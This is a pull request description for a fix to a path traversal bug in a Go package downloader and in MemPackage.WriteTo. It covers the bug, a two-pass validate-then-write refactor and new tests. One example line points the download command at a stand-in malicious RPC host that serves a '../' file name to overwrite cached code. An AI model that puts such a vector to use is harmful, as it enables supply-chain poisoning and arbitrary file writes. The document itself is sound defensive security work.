# PR #5219 — Fix: Prevent Path Traversal in `pkgdownload.Download` and `MemPackage.WriteTo`

## Vulnerability

A malicious `PackageFetcher` (e.g. a compromised or rogue RPC endpoint) could
return file names containing `..` path segments. When `pkgdownload.Download` or
`MemPackage.WriteTo` joined these file names with the destination directory and
wrote them to disk, the resulting paths escaped the intended directory. This
enabled:

- **Supply-chain poisoning** — overwriting legitimately cached packages in the
  module cache with backdoored code.
- **Arbitrary file writes** — writing to any location writable by the process.

Example attack vector:
```
gno mod download -remote-overrides "gno.land=http://evil-rpc.example.com:26657"
```
The evil RPC returns a file named `../ufmt/ufmt.gno` with malicious content,
which overwrites the cached `ufmt` package.

## Original Fix (commit `e43ec4f94`)

Added path traversal validation in two functions:

1. **`gnovm/pkg/packages/pkgdownload/pkgdownload.go` — `Download()`**
2. **`tm2/pkg/std/memfile.go` — `MemPackage.WriteTo()`**

Both functions resolve the destination directory and each file path to absolute
paths, then verify with `strings.HasPrefix` that every file resolves within the
destination directory. If a traversal is detected, the function returns an error.

## Review Feedback (MikaelVallenet)

> "should we validate upfront before any `os.WriteFile` to avoid partially
> written state?"

The original fix performed validation **inside** the same loop that wrote files.
This meant that if the file list was `[good.gno, evil.gno]`, `good.gno` would
be written to disk before `evil.gno` triggered the traversal error — leaving the
filesystem in a partially written, inconsistent state.

## Applied Fix (this commit)

Refactored both functions to use a **two-pass approach**:

### Pass 1 — Validate all paths
Iterate over all files and verify that every resolved absolute path is contained
within the destination directory. If any file fails this check, return an error
**immediately, before writing anything**.

### Pass 2 — Write all files
Only after all paths have been validated, iterate again and write each file to
disk.

### Changes made

#### `gnovm/pkg/packages/pkgdownload/pkgdownload.go`
- Separated the validation loop from the write loop.
- The first loop checks all file paths for traversal; the second loop performs
  `os.WriteFile` calls.

#### `tm2/pkg/std/memfile.go`
- Same two-pass refactor applied to `MemPackage.WriteTo()`.

#### `gnovm/pkg/packages/pkgdownload/pkgdownload_test.go`
- Added `TestDownload_NoPartialWriteOnTraversal`: provides a mix of one
  legitimate file and one malicious file. Asserts that after the error, the
  legitimate file was **not** written to disk (proving upfront validation).

#### `tm2/pkg/std/memfile_test.go`
- Added `TestWriteTo_NoPartialWriteOnTraversal`: same pattern — a legitimate
  file followed by a malicious file. Asserts no files were written.

### Test results

All tests pass:
```
=== RUN   TestDownload_RejectsPathTraversal        --- PASS
=== RUN   TestDownload_NoPartialWriteOnTraversal   --- PASS
=== RUN   TestWriteTo_RejectsPathTraversal         --- PASS
=== RUN   TestWriteTo_NoPartialWriteOnTraversal    --- PASS
```
